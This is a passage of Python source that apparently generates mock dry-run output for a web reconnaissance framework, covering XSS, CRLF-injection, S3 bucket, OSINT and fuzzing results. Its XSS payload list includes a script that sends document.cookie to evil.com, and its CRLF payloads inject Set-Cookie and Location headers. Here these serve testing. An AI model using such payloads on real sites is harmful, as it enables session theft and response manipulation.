            "<script>alert(1)</script>",
            "javascript:alert(document.domain)",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
        ]
        
        # Dalfox output message types
        message_types = [
            "Reflected XSS found",
            "DOM XSS found",
            "Stored XSS found",
            "Blind XSS potentially found",
            "CSP Bypass found",
            "Template injection found"
        ]
        
        # Parameters commonly vulnerable to XSS
        params = ["q", "search", "id", "user", "input", "query", "keyword", "redirect", "url", "data"]
        
        for url in urls:
            for _ in range(count):
                payload = random.choice(xss_payloads)
                param = random.choice(params)
                message_type = random.choice(message_types)
                
                # Create mock vulnerability with Dalfox expected structure
                vulnerability = {
                    "param": param,
                    "type": "xss",
                    "payload": payload,
                    "evidence": f"Found XSS in {param} parameter",
                    "message": message_type,
                    "message_str": f"Try this payload: {payload}",
                    "severity": random.choice(["high", "medium", "critical"]),
                    "url": f"{url}?{param}={payload}",
                    "poc": f"curl -X GET '{url}?{param}={payload}'",
                    "raw": f"GET /?{param}={payload} HTTP/1.1\nHost: {url.replace('https://', '').replace('http://', '')}\nUser-Agent: Mozilla/5.0\nAccept: */*",
                    "recommendation": "Implement proper input validation and output encoding",
                    "timestamp": datetime.now().isoformat()
                }
                
                vulnerabilities.append(vulnerability)

        return vulnerabilities

    def _generate_crlfuzz_output(self, urls, count=5):
        """
        Generate mock crlfuzz output

        Args:
            urls (list): List of URLs to associate vulnerabilities with
            count (int): Number of vulnerabilities to generate per URL
            
        Returns:
            list: List of mock CRLFUZZ vulnerability dictionaries
        """

        vulnerabilities = []
        
        # CRLF Injection payloads
        crlf_payloads = [
            "%0D%0ASet-Cookie: crlfinjection=crlfinjection",
            "%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
            r"%0D%0ASet-Cookie: csrf=fake_token",
            r"%%0d%0aLocation:%20https://evil.com",
            r"%E5%98%8D%E5%98%8ASet-Cookie:crlf=injection",
            r"%0dSet-Cookie:crlfinjection=crlfinjection",
            r"%0aSet-Cookie:crlfinjection=crlfinjection",
            r"%0d%0aSet-Cookie:%20malicious=1"
        ]
        
        # Response headers that might be affected
        affected_headers = [
            "Set-Cookie", 
            "Location", 
            "Content-Type", 
            "Content-Length", 
            "X-XSS-Protection", 
            "Content-Disposition"
        ]
        
        for url in urls:
            for _ in range(count):
                payload = random.choice(crlf_payloads)
                affected_header = random.choice(affected_headers)
                
                # Generate a mock vulnerable URL
                full_url = f"{url}?param={payload}"
                
                # Create mock vulnerability with CRLFUZZ expected structure
                vulnerability = {
                    "url": full_url,
                    "payload": payload,
                    "impact": f"HTTP Header Injection affecting {affected_header}",
                    "evidence": f"HTTP/1.1 200 OK\r\n{affected_header}: malicious_value\r\n",
                    "severity": "medium",
                    "description": "CRLF Injection allows attackers to inject headers into the HTTP response",
                    "details": "This vulnerability occurs when user-supplied input that contains CR and LF characters is included in HTTP response headers without proper sanitization.",
                    "remediation": "Validate and sanitize user input before including it in HTTP response headers. Use a whitelist approach to validate input.",
                    "request": f"GET {full_url.replace(url, '')} HTTP/1.1\nHost: {url.replace('https://', '').replace('http://', '')}\nUser-Agent: Mozilla/5.0",
                    "response": f"HTTP/1.1 200 OK\r\n{affected_header}: malicious_value\r\nContent-Type: text/html\r\n\r\n<html></html>",
                    "timestamp": datetime.now().isoformat()
                }
                
                vulnerabilities.append(vulnerability)

        return vulnerabilities

    def _generate_s3scanner_vulnerabilities(self, count=5):
        """
        Generate mock s3scanner output

        Args:
            count (int): Number of buckets to generate
        """
        results = []

        # Providers for the mock data
        providers = ["AWS", "GCP", "Azure", "DigitalOcean", "Alibaba"]

        # Regions for AWS
        aws_regions = [
            "us-east-1", "us-east-2", "us-west-1", "us-west-2",
            "eu-west-1", "eu-central-1", "ap-south-1", "ap-northeast-1"
        ]

        # Company names for bucket naming
        companies = ["company", "enterprise", "corp", "org", "tech", "app", "data", "backup", "storage", "assets"]

        # Owner IDs
        owner_ids = [
            "a123b456c789d0123e456f789g0123h456i789",
            "b234c567d890e1234f567g890h1234i567j890",
            "c345d678e901f2345g678h901i2345j678k901",
            "d456e789f012g3456h789i012j3456k789l012"
        ]

        # Owner display names
        owner_names = [
            "S3Owner", 
            "AdminUser", 
            "BucketAdmin", 
            "CloudOps", 
            "DevOpsTeam", 
            "CompanyName"
        ]

        # Generate mock buckets
        for _ in range(count):
            company = random.choice(companies)
            purpose = random.choice(["backup", "data", "static", "media", "archive", "logs", "config", "assets"])
            env = random.choice(["dev", "prod", "test", "staging", "uat"])

            # Generate a realistic-looking bucket name
            bucket_name = f"{company}-{purpose}-{env}-{random.randint(1000, 9999)}"

            # For some buckets, simulate misconfiguration with public permissions
            is_misconfigured = random.random() < 0.6  # 60% chance of misconfiguration

            # Create the bucket data structure matching what S3Scanner would return
            bucket = {
                "bucket": {
                    "name": bucket_name,
                    "region": random.choice(aws_regions),
                    "provider": random.choice(providers),
                    "owner_display_name": random.choice(owner_names),
                    "owner_id": random.choice(owner_ids),
                    # Permissions - some set to misconfigured
                    "perm_auth_users_read": random.random() < 0.3 if is_misconfigured else False,
                    "perm_auth_users_write": random.random() < 0.2 if is_misconfigured else False,
                    "perm_auth_users_read_acl": random.random() < 0.2 if is_misconfigured else False,
                    "perm_auth_users_write_acl": random.random() < 0.1 if is_misconfigured else False,
                    "perm_auth_users_full_control": random.random() < 0.1 if is_misconfigured else False,
                    "perm_all_users_read": random.random() < 0.5 if is_misconfigured else False,
                    "perm_all_users_write": random.random() < 0.3 if is_misconfigured else False,
                    "perm_all_users_read_acl": random.random() < 0.2 if is_misconfigured else False,
                    "perm_all_users_write_acl": random.random() < 0.2 if is_misconfigured else False,
                    "perm_all_users_full_control": random.random() < 0.1 if is_misconfigured else False,
                    # Bucket stats
                    "num_objects": random.randint(5, 10000),
                    "bucket_size": random.randint(1024, 1073741824),  # Size in bytes (1KB to 1GB)
                    "created_at": (datetime.now().replace(
                        day=random.randint(1, 28),
                        month=random.randint(1, 12),
                        year=random.randint(2020, 2023)
                    )).isoformat(),
                    "url": f"https://{bucket_name}.s3.amazonaws.com/"
                },
                "timestamp": datetime.now().isoformat(),
                "scan_id": f"s3scan-{random.randint(10000, 99999)}"
            }

            results.append(bucket)

        return results

    def _generate_github_repos(self, count=5, domain=None):
        """Generate mock GitHub repository data for OSINT.
        
        Args:
            count (int): Number of repositories to generate
            domain (str): Base domain to use for organization name
            
        Returns:
            list: List of mock GitHub repositories
        """
        repo_prefixes = [
            'api', 'web', 'app', 'backend', 'frontend', 'mobile', 'desktop',
            'core', 'utils', 'tools', 'lib', 'framework', 'sdk', 'client'
        ]
        
        repo_suffixes = [
            '', '-v2', '-service', '-library', '-app', '-tool', '-project',
            '-framework', '-lib', '-module', '-component', '-sdk'
        ]
        
        languages = [
            'JavaScript', 'Python', 'Java', 'Go', 'TypeScript', 'PHP',
            'Ruby', 'C#', 'C++', 'Swift', 'Kotlin', 'Rust'
        ]
        
        # Determine org name from domain
        if domain:
            org_name = domain.split('.')[0].lower()
        else:
            org_name = random.choice(['company', 'corp', 'tech', 'labs', 'dev'])
        
        repos = []
        for _ in range(count):
            prefix = random.choice(repo_prefixes)
            suffix = random.choice(repo_suffixes)
            repo_name = f"{prefix}{suffix}"
            
            # Randomly choose if public or private
            is_public = random.random() < 0.6  # 60% chance of public
            
            repo = {
                'name': repo_name,
                'full_name': f"{org_name}/{repo_name}",
                'url': f"https://github.com/{org_name}/{repo_name}",
                'description': f"A {prefix} {suffix.replace('-', ' ').strip()} for {org_name}",
                'is_public': is_public,
                'language': random.choice(languages),
                'stars': random.randint(0, 1000) if is_public else 0,
                'forks': random.randint(0, 200) if is_public else 0,
                'last_updated': f"2023-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}T{random.randint(0, 23):02d}:{random.randint(0, 59):02d}:00Z"
            }
            
            repos.append(repo)
        
        return repos

    def _generate_subdomain_data(self, domain, count=10):
        """Generate a list of mock subdomains for a given domain."""
        common_prefixes = ['www', 'api', 'dev', 'stage', 'test', 'admin', 'app', 'mail', 
                        'blog', 'shop', 'support', 'secure', 'portal', 'beta', 'cdn']

        subdomains = [f"www.{domain}"]

        # Add random additional subdomains
        remaining = min(count-1, len(common_prefixes)-1)  # -1 for www that's already added
        subdomains.extend(
            f"{prefix}.{domain}"
            for prefix in random.sample(common_prefixes[1:], remaining)
        )
        return subdomains

    def _generate_employees(self, count=5):
        """Generate mock employee data for OSINT.
        
        Args:
            count (int): Number of employees to generate
            
        Returns:
            list: List of mock employee information
        """
        first_names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emma', 'Robert', 'Lisa']
        last_names = ['Smith', 'Johnson', 'Williams', 'Jones', 'Brown', 'Miller', 'Davis', 'Wilson']
        positions = [
            'CEO', 'CTO', 'CFO', 'CIO', 'Software Engineer', 'System Administrator',
            'Security Analyst', 'IT Manager', 'DevOps Engineer', 'Data Scientist'
        ]
        
        employees = []
        for _ in range(count):
            first_name = random.choice(first_names)
            last_name = random.choice(last_names)
            
            employee = {
                'name': f"{first_name} {last_name}",
                'position': random.choice(positions),
                'social_links': {}
            }
            
            # Add social media profiles with some probability
            if random.random() < 0.8:  # 80% chance of LinkedIn
                employee['social_links']['linkedin'] = f"https://www.linkedin.com/in/{first_name.lower()}-{last_name.lower()}-{random.randint(100, 999)}"
            
            if random.random() < 0.5:  # 50% chance of Twitter
                employee['social_links']['twitter'] = f"https://twitter.com/{first_name.lower()}{last_name.lower()}{random.randint(1, 99)}"
            
            employees.append(employee)
        
        return employees

    def _generate_whois_data(self, domain):
        """Generate mock whois data for a given domain
        
        Args:
            domain (str): The domain to generate whois data for
        
        """
        return {
                'registrar': 'Mock Registrar Inc.',
                'creation_date': '2010-01-15T00:00:00Z',
                'expiration_date': '2025-01-15T00:00:00Z',
                'last_updated': '2022-07-22T00:00:00Z',
                'name_servers': [f'ns1.{domain}', f'ns2.{domain}'],
                'status': ['clientTransferProhibited'],
                'emails': [f'admin@{domain}', f'tech@{domain}'],
            }

    def _generate_related_domains(self, domain):
        """Generate mock related domains for a given domain
        
        Args:
            domain (str): The domain to generate related domains for
        
        """
        return [
            f"related1.{domain}",
            f"related2.{domain}",
            f"subsidiary.{domain}",
            f"partner.{domain}",
        ]

    def _generate_social_media(self, domain):
        """Generate mock social media data for a given domain
        
        Args:
            domain (str): The domain to generate social media data for
        
        """
        return {
            'linkedin': f"https://www.linkedin.com/company/{domain.split('.')[0]}",
            'twitter': f"https://twitter.com/{domain.split('.')[0]}",
            'facebook': f"https://facebook.com/{domain.split('.')[0]}",
        }

    def _generate_random_technologies(self):
        """Generate a list of random web technologies.
        
        Returns:
            list: Random selection of web technologies
        """
        tech_options = ['jQuery', 'Bootstrap', 'React', 'Angular', 'Vue.js', 
                       'WordPress', 'PHP', 'Django', 'Flask', 'Express', 
                       'Rails', 'Laravel', 'Nginx', 'Apache', 'Cloudflare',
                       'MySQL', 'PostgreSQL', 'MongoDB', 'Redis', 'Elasticsearch',
                       'Kubernetes', 'Docker', 'AWS', 'Azure', 'Google Cloud',
                       'Cloudflare', 'DigitalOcean', 'Vercel', 'Heroku', 'Netlify',
                       'Cloudflare', 'DigitalOcean', 'Vercel', 'Heroku', 'Netlify',
        ]
                       
        
        return random.sample(tech_options, k=random.randint(1, 3))

    def _generate_screenshot_result(self, url, results_dir):
        """Generate mock screenshot result for a single URL.
        
        Args:
            url (str): URL to generate screenshot for
            results_dir (str): Directory to store results
            
        Returns:
            dict: Mock screenshot data for the URL
        """
        parsed_url = urlparse(url)
        hostname = parsed_url.netloc
        
        # Create a safe filename
        filename = self._create_screenshot_filename(hostname)
        
        # Define the mock screenshot path
        screenshot_path = self._create_screenshot_file(filename, results_dir)
        
        # Generate mock screenshot data
        return {
            'url': url,
            'status': 'success',
            'screenshot_path': screenshot_path,
            'width': 1280,
            'height': 800,
            'technologies': self._generate_random_technologies(),
        }

    def _generate_urls(self, count=10, base_domains=None, subdomains=True, paths=True, params=False):
        """Generate mock URLs for dry run testing
        
        This function creates realistic-looking URLs that can be used during dry run tests
        to simulate real scan targets without actually querying the database or real systems.
        
        Args:
            count (int): Number of URLs to generate
            base_domains (list): List of base domains to use (e.g., ['example.com', 'test.org'])
                                If None, default domains will be used
            subdomains (bool): Whether to include subdomains
            paths (bool): Whether to include paths
            params (bool): Whether to include query parameters
            
        Returns:
            list: List of mock URLs
        """
        # Default domains if none provided
        if not base_domains:
            base_domains = [
                'example.com', 
                'test.org', 
                'dryrun.local', 
                'mockdata.net',
                'fakescan.io'
            ]
        
        # Components for generating realistic-looking URLs
        subdomain_prefixes = [
            'api', 'dev', 'test', 'staging', 'prod', 'app', 'admin', 
            'portal', 'secure', 'login', 'web', 'mail', 'support', 
            'dashboard', 'vpn', 'docs', 'cdn', 'static', 'media'
        ]
        
        path_components = [
            'login', 'admin', 'dashboard', 'users', 'products', 'api', 
            'docs', 'help', 'support', 'profile', 'settings', 'search',
            'assets', 'images', 'css', 'js', 'upload', 'download'
        ]
        
        param_names = [
            'id', 'user', 'page', 'q', 'token', 'session', 'redirect',
            'sort', 'filter', 'limit', 'offset', 'type', 'format'
        ]
        
        # Generate URLs
        mock_urls = []
        for _ in range(count):
            # Start with a random base domain
            base_domain = random.choice(base_domains)
            url = f"https://{base_domain}"
            
            # Add subdomain (with 70% probability if enabled)
            if subdomains and random.random() < 0.7:
                prefix = random.choice(subdomain_prefixes)
                url = f"https://{prefix}.{base_domain}"
            
            # Add path (with 80% probability if enabled)
            if paths and random.random() < 0.8:
                path_depth = random.randint(1, 3)
                path = '/'.join(random.choice(path_components) for _ in range(path_depth))
                url = f"{url}/{path}"
                
                # Sometimes add file extension
                if random.random() < 0.3:
                    extensions = ['.html', '.php', '.asp', '.jsp', '.json', '.xml']
                    url = f"{url}{random.choice(extensions)}"
            
            # Add query parameters (with 40% probability if enabled)
            if params and random.random() < 0.4:
                param_count = random.randint(1, 3)
                query_params = []
                for _ in range(param_count):
                    param = random.choice(param_names)
                    value = f"value{random.randint(1, 100)}"
                    query_params.append(f"{param}={value}")
                url = f"{url}?{'&'.join(query_params)}"
            
            mock_urls.append(url)
        
        logger.info(f"🧪 Generated {len(mock_urls)} mock URLs for dry run testing")
        return mock_urls

    def _get_screenshot_urls(self, kwargs, ctx):
        """Extract URLs for screenshot from kwargs or context.
        
        Args:
            kwargs (dict): Keyword arguments
            ctx (dict): Task context
            
        Returns:
            list: URLs to process
        """
        # Try to get URLs from arguments
        urls = kwargs.get('urls', None)
        
        # Try to get URLs from context if not in arguments
        if not urls and ctx:
            urls = ctx.get('endpoints', [])
        
        # Generate mock URLs if none provided
        if not urls:
            base_domains = [ctx['domain_name']] if ctx and 'domain_name' in ctx else None
            urls = self._generate_urls(count=10, base_domains=base_domains)
        elif isinstance(urls, dict):
            # If urls is a dictionary of endpoints, extract the URLs
            urls = list(urls.keys())
        
        return urls

    def _write_json_results(self, output_dir, fuzzing_results):
        """Write fuzzing results to a JSON file."""
        results_file = os.path.join(output_dir, 'fuzzing_results.json')
        with open(results_file, 'w') as f:
            json.dump(fuzzing_results, f, indent=2)

    def _write_tool_results(self, output_dir, tool, urls, fuzzing_results):
        """Write tool-specific formatted output file.
        
        Args:
            output_dir (str): Directory to write to
            tool (str): Tool name ('dirsearch', 'gobuster', or 'ffuf')
            urls (list): URLs that were fuzzed
            fuzzing_results (dict): Results to write
        """
        tool_file = os.path.join(output_dir, f"{tool}_results.txt")
        
        with open(tool_file, 'w') as f:
            # Write common header
            f.write(f"# Target: {', '.join(urls)}\n")
            f.write(f"# Date: {fuzzing_results['timestamp']}\n")
            f.write(f"# Tool: {tool}\n\n")
            
            # Write tool-specific content
            if tool == 'dirsearch':
                self._write_dirsearch_format(f, fuzzing_results, urls)
            elif tool == 'gobuster':
                self._write_gobuster_format(f, fuzzing_results)
            elif tool == 'ffuf':
                self._write_ffuf_format(f, fuzzing_results)

    def _write_dirsearch_format(self, file, fuzzing_results, urls):
        """Write results in dirsearch format."""
        file.write(f"# Dirsearch started at {fuzzing_results['timestamp']}\n")
        file.write(f"# Command: dirsearch -u {', '.join(urls)} -e php,html,js\n\n")
        
        for status, endpoints in fuzzing_results['endpoints_by_status'].items():
            for endpoint in endpoints:
                if endpoint.get('discovered_by') == 'dirsearch':
                    file.write(f"[{status}] {endpoint['url']} - {endpoint['content_length']} bytes\n")

    def _write_gobuster_format(self, file, fuzzing_results):
        """Write results in gobuster format."""
        file.write("Gobuster v3.1.0\n")
        file.write("by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n\n")
        
        for status, endpoints in fuzzing_results['endpoints_by_status'].items():
            for endpoint in endpoints:
                if endpoint.get('discovered_by') == 'gobuster':
                    path = endpoint['url'].split('/')[-1]
                    file.write(f"/{path} (Status: {status}) [Size: {endpoint['content_length']}]\n")

    def _write_ffuf_format(self, file, fuzzing_results):
        """Write results in ffuf format."""
        file.write("ffuf report\n\n")
        
        for status, endpoints in fuzzing_results['endpoints_by_status'].items():
            for endpoint in endpoints:
                if endpoint.get('discovered_by') == 'ffuf':
                    file.write(f"| URL | {endpoint['url']} |\n")
                    file.write(f"| Status | {status} |\n")
                    file.write(f"| Length | {endpoint['content_length']} |\n")
                    file.write("-" * 50 + "\n")
